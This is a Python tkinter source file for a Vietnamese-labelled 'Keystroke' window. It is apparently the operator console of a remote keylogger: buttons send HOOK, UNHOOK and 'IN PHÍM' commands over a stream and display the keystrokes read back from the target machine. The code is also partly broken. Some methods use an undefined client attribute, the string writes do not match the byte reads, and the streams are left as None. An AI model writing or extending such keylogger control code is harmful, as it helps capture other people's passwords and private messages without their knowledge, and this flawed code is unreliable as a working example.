import tkinter as tk
from tkinter import Text, Button
import threading


class KeylogForm:
    def __init__(self, nw, nr):
        self.root = tk.Tk()  # Create the main window
        self.root.title("Keystroke")
        self.root.geometry("347x271")

        self.nw = nw
        self.nr = nr

        self.txtKQ = Text(self.root, state="disabled")
        self.txtKQ.place(x=12, y=77, width=318, height=182)
        self.txtKQ.configure(state="normal")
        self.txtKQ.delete("1.0", tk.END)

        self.button1 = Button(self.root, text="Hook", command=self.button1_Click)
        self.button1.place(x=12, y=12, width=75, height=59)

        self.button2 = Button(self.root, text="Unhook", command=self.button2_Click)
        self.button2.place(x=93, y=13, width=75, height=58)

        self.button3 = Button(self.root, text="In phím", command=self.button3_Click)
        self.button3.place(x=174, y=12, width=75, height=59)

        self.butXoa = Button(self.root, text="Xóa", command=self.butXoa_Click)
        self.butXoa.place(x=256, y=13, width=74, height=58)

    def button1_Click(self):
        s = "HOOK"
        self.nw.write(s)
        self.nw.flush()

    def button2_Click(self):
        s = "UNHOOK"
        self.nw.write(s)
        self.nw.flush()

    def button3_Click(self):
        s = "IN PHÍM"
        self.nw.write(s)
        self.nw.flush()

        data = self.nr.read(5000).decode("utf-8")
        self.txtKQ.configure(state="normal")
        self.txtKQ.insert(tk.END, data)
        self.txtKQ.configure(state="disabled")

    def keylog_closing(self):
        s = "XÓA"
        self.nw.write(s)
        self.nw.flush()
        self.root.destroy()

    def butXoa_Click(self):
        self.txtKQ.configure(state="normal")
        self.txtKQ.delete("1.0", tk.END)
        self.txtKQ.configure(state="disabled")

    def run(self):
        self.root.mainloop()


    def form_closing(self):
        self.send_message("QUIT")
        self.root.destroy()

    def send_message(self, message):
        if self.client:
            self.client.sendall(message.encode())

    def receive_message(self):
        try:
            response = self.client.recv(1024).decode()
            return response
        except:
            return "Error receiving response"


if __name__ == "__main__":
    app = KeylogForm(None, None)  # Replace None with actual nw and nr streams
    app.run()
